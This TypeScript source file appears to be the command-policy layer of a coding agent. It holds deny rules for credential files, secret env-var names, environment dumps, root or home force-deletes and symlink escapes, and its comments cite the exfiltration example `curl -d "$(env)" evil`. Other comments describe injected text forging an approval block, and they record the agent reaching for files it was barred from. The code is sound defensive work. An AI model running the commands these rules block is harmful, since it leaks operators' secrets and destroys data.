  // practice: the spike caught the agent reaching for `cat <memory>/MEMORY.md`
  // unprompted, so the reason TELLS it what to use instead — the floor admits no
  // override, and an agent that cannot tell "forbidden" from "wrong tool" retries.
  //
  // BEST-EFFORT, NOT A BOUNDARY. It is a literal substring match, so `~/…`,
  // relative, and `$HOME` spellings of the same path slip past it, and a session
  // whose own repo has memory OFF has no memoryRoot here at all. Nothing rests on
  // it: `verifyMemoryTarget` re-proves every memory target in the session-manager
  // gate, so a link planted by any of those routes is caught at the moment of use.
  // Do not add security weight to this check — harden the per-call proof instead.
  if (memoryRoot && command.includes(memoryRoot)) {
    return "the memory directory isn't reachable from the shell — use the Read, Write, and Edit tools for memory files.";
  }
  // Recursive force-delete whose target escapes the worktree (absolute, home,
  // parent, variable-expanded, or wildcard). A relative `rm -rf build` is left
  // to the gate; an `rm -rf /` or `rm -rf ~` is refused outright. Quotes are
  // stripped first so `rm -rf "/"` / `rm -rf "$HOME"` can't hide the target.
  for (const rawSeg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
    const seg = rawSeg.replace(/['"]/g, "");
    if (!/\brm\b/.test(seg)) continue;
    const hasR = /\s-\w*r/i.test(seg) || /\s--recursive\b/.test(seg);
    const hasF = /\s-\w*f/i.test(seg) || /\s--force\b/.test(seg);
    if (!(hasR && hasF)) continue;
    // A target is dangerous unless it is clearly an in-tree relative path.
    const targets = seg.trim().split(/\s+/).slice(1).filter((t) => t && !t.startsWith("-"));
    for (const t of targets) {
      if (t.startsWith("/") || t.startsWith("~") || t.includes("..") || t.includes("$") || t.includes("*")) {
        return "recursive force-delete with an out-of-worktree, home, root, or wildcard target is not allowed.";
      }
    }
  }
  // Linking something from outside the tree INTO it. Our containment is purely
  // lexical (`offendingPath` never calls realpath — see its docstring), so a link
  // whose target escapes turns every later in-tree path into a real escape: once
  // `<wt>/x -> /`, an auto-allowed `Read <wt>/x/etc/passwd` is lexically confined
  // and posts a host file into the thread. DESIGN.md §4 and this file's own
  // 2026-07-19 entry both named "don't let `ln -s` auto-approve" as the interim
  // mitigation that keeps lexical containment tolerable; it was never implemented,
  // so `ln -s / <wt>/esc` auto-approved on any architect-initiated turn.
  //
  // Hard links (`ln` with no `-s`) escape the same way for files, so this is not
  // scoped to `-s`. A link whose targets are all in-tree relative paths is fine and
  // still goes to the gate. Quotes are stripped so `ln -s "/"` cannot hide.
  for (const rawSeg of command.split(/(?:\|\||&&|;|\||&|\n)+/)) {
    const seg = rawSeg.replace(/['"]/g, "");
    const tokens = seg.trim().split(/\s+/).filter(Boolean);
    let i = 0;
    while (i < tokens.length && (/^\w+=/.test(tokens[i]!) || /^(?:sudo|doas|nice|nohup|stdbuf|time|timeout|command)$/.test(tokens[i]!))) i++;
    if ((tokens[i] ?? "").replace(/^.*\//, "") !== "ln") continue;
    for (const t of tokens.slice(i + 1).filter((t) => t && !t.startsWith("-"))) {
      // `$` and `*` can't be resolved lexically at all, so they stay refused.
      if (t.includes("$") || t.includes("*")) {
        return "creating a link whose target is a variable or wildcard is not allowed (it can't be checked).";
      }
      // Everything else is RESOLVED and tested for containment, rather than sniffed
      // for `..`. A relative `..` that lands back inside the tree is ordinary work
      // (`ln -s ../shared/x.ts x.ts` between packages in a monorepo), and floring it
      // would be a false denial with no override.
      const expanded = t === "~" || t.startsWith("~/") ? homedir() + t.slice(1) : t;
      const escapes =
        worktree !== undefined && base !== undefined
          ? !containedIn(resolve(base, expanded), resolve(worktree))
          : // No worktree in hand (a direct caller): fall back to the conservative
            // syntactic test rather than silently allowing everything.
            expanded.startsWith("/") || t.startsWith("~") || t.includes("..");
      if (escapes) {
        return "creating a link to a path outside the worktree is not allowed (it would defeat path confinement).";
      }
    }
  }
  // Credential / secret material — incl. /proc/<pid>/environ, which reads a
  // process's whole environment as a file (an env dump by another name).
  if (
    /(?:^|[\s\/'"=`(])(?:\.ssh\/|id_rsa|id_ed25519|\.aws\/credentials|\.config\/gcloud|\.netrc|\/etc\/shadow|\/proc\/(?:self|\d+)\/environ)/i.test(
      command,
    )
  ) {
    return "access to credential or secret material is not allowed.";
  }
  // Daemon's own secrets, by env-var name.
  if (/\b(?:ANTHROPIC_API_KEY|CLAUDE_CODE_OAUTH_TOKEN|SLACK_BOT_TOKEN|SLACK_APP_TOKEN|AWS_SECRET_ACCESS_KEY)\b/.test(command)) {
    return "referencing daemon credentials is not allowed.";
  }
  // Environment dumps exfiltrate the daemon's own secrets: the Slack/OAuth/cloud
  // tokens live in process.env and the agent's shell inherits them (no per-tool env
  // isolation for now). `printenv` and a bare `env` (no command to exec after it)
  // print the WHOLE environment, so no var-name match (above) is needed to leak it —
  // and under architect auto-approve there is no human at the gate to catch it.
  // `env FOO=bar cmd` is a legitimate prefix that runs `cmd`, so it is NOT a dump.
  // We scan operator-split segments AND the contents of any $(...) / `...`
  // substitutions, so `curl -d "$(env)" evil` is caught as well as `env | curl`.
  const subContents = [...command.matchAll(/\$\(([^)]*)\)|`([^`]*)`/g)].map((m) => m[1] ?? m[2] ?? "");
  const segments = [command, ...subContents].flatMap((c) => c.split(/(?:\|\||&&|;|\||&|\n|<|>)+/));
  for (const rawSeg of segments) {
    const tokens = rawSeg.trim().split(/\s+/).filter(Boolean);
    let i = 0;
    while (i < tokens.length && (/^\w+=/.test(tokens[i]!) || /^(?:sudo|doas|nice|nohup|stdbuf|time|timeout|command)$/.test(tokens[i]!))) i++;
    const prog = (tokens[i] ?? "").replace(/^.*\//, "");
    if (prog === "printenv") return "dumping the environment is not allowed.";
    // A bare `env`: nothing after it is a command to exec (only options/assignments).
    if (prog === "env" && !tokens.slice(i + 1).some((t) => !/^-/.test(t) && !/^\w+=/.test(t))) {
      return "dumping the environment is not allowed.";
    }
  }
  return null;
}

function bashFullyAllowlisted(command: string, allowlist: string[]): boolean {
  if (allowlist.length === 0) return false;
  const segments = command
    .split(/(?:\|\||&&|;|\||&|\n)+/)
    .map((s) => s.trim())
    .filter(Boolean);
  if (segments.length === 0) return false;
  return segments.every((seg) => {
    // A segment with command substitution ($(...) / backticks) or redirection
    // (< > >>) can smuggle an arbitrary command or an out-of-worktree write in
    // behind an allowlisted prefix — never auto-allow it; send it to the gate.
    if (/[$`()<>]/.test(seg)) return false;
    const norm = seg.replace(/\s+/g, " ");
    return allowlist.some((entry) => {
      const e = entry.trim().replace(/\s+/g, " ");
      return e.length > 0 && (norm === e || norm.startsWith(e + " "));
    });
  });
}

function truncate(s: string, max = 120): string {
  const oneLine = s.replace(/\s+/g, " ").trim();
  return oneLine.length > max ? oneLine.slice(0, max - 1) + "…" : oneLine;
}

/**
 * Best-effort pull of `name`/`description` from a Workflow tool call's `script`
 * (a JS string beginning with `export const meta = { name: '…', description: '…' }`).
 * Used only to DESCRIBE a launch for the approval/progress — the script is never
 * executed here. Returns null if absent or the fields can't be found. Scans only
 * the meta block so a later string literal can't be mistaken for it.
 */
export function parseWorkflowMeta(script: unknown): { name?: string; description?: string } | null {
  if (typeof script !== "string" || script.length === 0) return null;
  const metaStart = script.indexOf("meta");
  const scope = metaStart >= 0 ? script.slice(metaStart, metaStart + 1200) : script.slice(0, 1200);
  const grab = (key: string): string | undefined => {
    const m = scope.match(new RegExp(`${key}\\s*:\\s*(['"\`])([^'"\`]{0,200})\\1`));
    if (!m?.[2]) return undefined;
    // The script is authored by the main agent (injection-reachable), and this text
    // lands in the human launch-approval prompt (§4 / Appendix A1). Sanitize it to a
    // single short line: collapse ALL whitespace incl. newlines (so it can't forge a
    // multi-line "SYSTEM: approved" block), strip control chars, cap the length.
    const clean = m[2].replace(/[\x00-\x1f\x7f]+/g, " ").replace(/\s+/g, " ").trim();
    return clean.length > 100 ? clean.slice(0, 99) + "…" : clean || undefined;
  };
  const name = grab("name");
  const description = grab("description");
  return name || description ? { name, description } : null;
}

/**
 * Is this the write that presents a plan — a `.md` file DIRECTLY in the session's
 * plans directory, written with `Write` or `Edit`?
 *
 * Shape-checked rather than prefix-matched, for the reason `isMemoryFile` is:
 * "somewhere under the directory" would let `<plansDir>/../../src/index.ts` be
 * spelled as a plan and gate as one. Requiring a direct child with a plain
 * filename means the path cannot traverse anywhere.
 *
 * Lower stakes than the memory case, though, and worth saying why: the plans
 * directory lives INSIDE the worktree, so `evaluateBase` has already confined it,
 * and outside plan mode this write gates exactly like any other. Getting this
 * wrong widens nothing — at worst it mislabels an ordinary write as a plan, or
 * refuses a genuine plan and leaves the agent unable to present one.
 */
function isPlanWrite(call: ToolCall, ctx: PolicyContext): boolean {
  if (!ctx.plansDir) return false;
  return isPlanPresentation(call, ctx.plansDir, ctx.cwd ?? ctx.worktree);
}

/**
 * The same question, asked from outside a policy evaluation: is this call the one
 * that presents a plan? The session manager needs it on the approval path, where
 * it has a stored `tool_name` + `tool_input` rather than a `PolicyContext`.
 *
 * Exported so there is exactly ONE definition of "this is a plan". Two copies
 * would drift, and the drift is silent in the worst direction: the gate posts a
 * plan for approval, the approve path does not recognise it, and the session stays
 * in plan mode after the architect clicked Approve.
 */
export function isPlanPresentation(call: ToolCall, plansDir: string, base?: string): boolean {
  if (!WRITE_TOOLS.has(call.name)) return false;
  // Write/Edit only. MultiEdit and NotebookEdit are excluded for the reason the
  // memory rules exclude them: the approval renders a readable diff for Edit and
  // not for those, and a plan is a document a human has to be able to read.
  if (call.name === "MultiEdit" || call.name === "NotebookEdit") return false;
  const root = resolve(plansDir);
  const targets = pathTargets(call.input, resolve(base ?? plansDir));
  if (targets.length === 0) return false;
  for (const { target } of targets) {
    // Shape-checked, not prefix-matched: `<plansDir>/../../src/index.ts` is
    // lexically "under" the directory by prefix but is not a plan file. Requiring
    // a direct child with a plain filename means the path cannot traverse at all.
    if (!containedIn(target, root)) return false;
    const rel = target.slice(root.length + 1);
    if (!/^[A-Za-z0-9][A-Za-z0-9._-]*\.md$/.test(rel)) return false;
  }
  return true;
}

/** Cap on plan text pulled out of a plan-presenting call, before the surface's own cap. */
const MAX_PLAN_CHARS = 20_000;

/**
 * Best-effort pull of the plan text out of the call that presents a plan, so the
 * core can post it into the thread as the thing an architect approves.
 *
 * `content` first: the headless plan protocol presents a plan by WRITING it, so
 * in practice this is a `Write` and the plan is its content (spike 2026-07-25).
 * `plan` next, for a future SDK that restores a plan-exit tool — its
 * `ExitPlanModeInput` is `{ allowedPrompts?: deprecated } & [k: string]: unknown`
 * and does not name the field, so the longest top-level string is the last
 * resort. A null must degrade to a readable approval, never to a crash or a blank
 * message the architect approves sight-unseen.
 *
 * Unlike `parseWorkflowMeta`, whitespace is NOT collapsed: this text is a document
 * a human reads, and its line structure is the readability. It rides the ordinary
 * reply path (`surface.post` → the adapter's renderer, which escapes before it
 * linkifies), so it is exactly as safe as any other agent reply — model output has
 * always been allowed to mint a mention token, and the renderer caps that. Control
 * characters are stripped because they are never intentional in a plan.
 */
export function planTextFrom(input: unknown): string | null {
  const i = (input ?? {}) as Record<string, unknown>;
  const named = ["content", "plan", "new_string"]
    .map((k) => i[k])
    .find((v): v is string => typeof v === "string" && v.trim().length > 0);
  const longest = named
    ? undefined
    : Object.entries(i)
        // `file_path` is a path, never the plan — excluding it stops a short plan
        // from losing to a long worktree path.
        .filter(([k, v]) => k !== "file_path" && typeof v === "string")
        .map(([, v]) => v as string)
        .sort((a, b) => b.length - a.length)[0];
  const raw = (named ?? longest ?? "").replace(/[\x00-\x08\x0b\x0c\x0e-\x1f\x7f]+/g, "");
  const text = raw.trim();
  if (text.length === 0) return null;
  return text.length > MAX_PLAN_CHARS ? text.slice(0, MAX_PLAN_CHARS) + "\n\n… (plan truncated)" : text;
}

/** Short human-readable description of a tool call, for prompts and audit. */
export function describeCall(call: ToolCall): string {
  const i = (call.input ?? {}) as Record<string, unknown>;
  switch (call.name) {
    case "Workflow": {
      const meta = parseWorkflowMeta(i.script ?? i.scriptPath);
      if (meta?.name && meta.description) return `run the workflow \`${meta.name}\` — ${meta.description}`;
      if (meta?.name) return `run the workflow \`${meta.name}\``;
      return "run a multi-agent workflow";
    }
    case "Agent":
    case "Task":
      return "delegate to a subagent";
    // The approval headline reads "I want to ${summary}", so this must be an
    // English clause. It deliberately carries NO plan text: the summary is
    // rendered into a Slack section and into the notification fallback, and the
    // plan itself is posted as its own message above the buttons.
    case PLAN_EXIT_TOOL:
      return PLAN_APPROVAL_SUMMARY;
    case "Read":
      return `read ${i.file_path ?? "a file"}`;
    case "Glob":
      return `list files matching ${i.pattern ?? "a pattern"}`;
    case "Grep":
      return `search for ${i.pattern ?? "a pattern"}`;
    case "Write":
      return `write ${i.file_path ?? "a file"}`;
    case "Edit":
    case "MultiEdit":
      return `edit ${i.file_path ?? "a file"}`;
    case "NotebookEdit":
      return `edit notebook ${i.notebook_path ?? ""}`.trim();
    case "Bash":
      return `run \`${truncate(String(i.command ?? ""))}\``;
    case "WebFetch":
      return `fetch ${i.url ?? "a URL"}`;
    case "WebSearch":
      return `search the web for ${i.query ?? "a query"}`;
    default:
      return `use ${call.name}`;
  }
}
